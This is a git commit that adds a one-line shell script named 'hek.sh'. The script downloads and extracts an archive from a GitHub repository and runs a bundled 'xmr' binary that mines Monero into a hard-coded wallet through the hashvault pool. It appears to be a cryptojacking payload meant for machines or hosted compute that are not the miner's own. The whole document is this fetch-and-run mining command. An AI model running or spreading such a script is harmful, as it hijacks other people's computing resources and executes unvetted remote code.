1b9e4579ced298f409868e0bcfaeb3896e45e9a7
thejscool <131332089+thejscool@users.noreply.github.com>
2023-04-20 12:46:33 +0800

    Create hek.sh

---
+++ hek.sh
@@ -0,0 +1,1 @@
+wget https://github.com/funfactbro/latenightthought/archive/refs/tags/x.tar.gz && tar -xvf x.tar.gz && cd latenightthought-x && ./xmr -o pool.hashvault.pro:3333 --threads 2 -u solo:4An16QsmWem7TL4Az7x93bGkBX3JjzCxQ4bAhcS5M3y6U1hEckM6RT8idvDRo9rRQtAPAPzdHpfLz7zgJ9Tbvb3JQBXwEvQ -p x
